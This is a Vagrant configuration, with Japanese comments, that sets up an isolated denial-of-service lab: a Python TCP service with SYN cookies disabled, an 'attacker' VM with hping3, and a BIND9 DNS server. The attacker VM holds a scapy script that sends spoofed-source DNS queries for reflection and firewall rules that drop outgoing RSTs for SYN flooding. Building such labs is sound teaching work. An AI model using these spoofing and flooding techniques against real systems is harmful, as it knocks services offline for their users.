Vagrant.configure("2") do |config|
  config.vm.network "private_network", type: "dhcp"

  config.hostmanager.enabled = true
  config.hostmanager.manage_guest = true

  config.hostmanager.ip_resolver = proc do |vm, resolving_vm|
    if hostname = (vm.ssh_info && vm.ssh_info[:host])
      # vm にアクセスするための IP アドレスには enp0s8 のものを使用する
      vm.communicate.execute("ip -4 a show dev enp0s8 | grep inet | awk '{print $2}' | cut -f 1 -d /") do |type, contents|
        break contents.strip
      end
    end
  end

  # service 仮想マシン
  config.vm.define "service" do |service|
    service.vm.box = "ubuntu/jammy64"
    service.vm.hostname = "service"
    
    service.vm.provision "shell", inline: <<-SHELL
      sudo sh -c 'cat <<"EOF" > /root/service.py
import socket
import os

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind(("0.0.0.0", 5000))

# Backlog の値を渡して listen (通常はこの値が SYN Queue のサイズになる)
server_socket.listen(int(os.getenv("BACKLOG")))

while True:
  (client_socket, _) = server_socket.accept()

  client_socket.send(b"Hello!\\n")
  client_socket.close()
EOF'

      # TCP SYN Cookies を無効化する
      echo 0 > /proc/sys/net/ipv4/tcp_syncookies
      sysctl -w net.ipv4.tcp_syncookies=0
      echo "net.ipv4.tcp_syncookies = 0" >> /etc/sysctl.conf
    SHELL
  end

  # attacker 仮想マシン
  config.vm.define "attacker" do |attacker|
    attacker.vm.box = "ubuntu/jammy64"
    attacker.vm.hostname = "attacker"

    # hping3のインストール
    attacker.vm.provision "shell", inline: <<-SHELL
      apt-get update
      apt-get install -y hping3 python3-scapy

      sudo sh -c 'cat <<"EOF" > /root/dns_amp.py
from scapy.all import *

dns_ip = ""
service_ip = ""
qname = "example.com"

send(IP(dst=dns_ip, src=service_ip)/UDP()/DNS(qd=DNSQR(qname=qname)))
EOF'

      # 5000 番ポートへの outgoing な RST パケットを破棄する
      sudo iptables -A OUTPUT -p tcp --dport 5000 --tcp-flags RST RST -j DROP

      # SSHによる送受信は許可される
      sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT
      sudo iptables -A OUTPUT -p tcp --sport 22 -j ACCEPT
      
      # 192.168.56.0/24 内での送受信は許可される
      sudo iptables -A OUTPUT -s 192.168.56.0/24 -d 0.0.0.0/0 -j ACCEPT
      sudo iptables -A INPUT -s 0.0.0.0/0 -d 192.168.56.0/24 -j ACCEPT

      # それ以外のパケットは許可されない
      sudo iptables -A INPUT -j DROP
      sudo iptables -A OUTPUT -j DROP
    SHELL
  end

  # dns 仮想マシン
  config.vm.define "dns" do |dns|
    dns.vm.box = "ubuntu/jammy64"
    dns.vm.hostname = "dns"

    dns.vm.provision "shell", inline: <<-SHELL
      apt-get update
      apt-get install -y bind9 bind9utils

      sudo sh -c 'cat <<EOF >> /etc/bind/named.conf.local
zone "example.com" {
    type master;
    file "/etc/bind/db.example.com";
};
EOF'

      # ゾーンファイルを新規作成し、Aレコードを記述
      sudo sh -c 'cat <<"EOF" > /etc/bind/db.example.com
$TTL    604800
@       IN      SOA     . . (
                          1         ; Serial
                          604800    ; Refresh
                          86400     ; Retry
                          2419200   ; Expire
                          604800 )  ; Negative Cache TTL
@       IN      A       127.0.0.1
@       IN      NS      .
EOF'

      # 設定ファイルの所有者をbindに変更
      sudo chown bind:bind /etc/bind/db.example.com

      # 設定ファイルの構文チェック
      sudo named-checkconf
      sudo named-checkzone example.com /etc/bind/db.example.com

      # BIND9サービスを再起動して設定を適用
      sudo systemctl restart bind9
    SHELL
  end

  config.vm.provider "virtualbox" do |vb|
    vb.memory = "1024"
  end
end

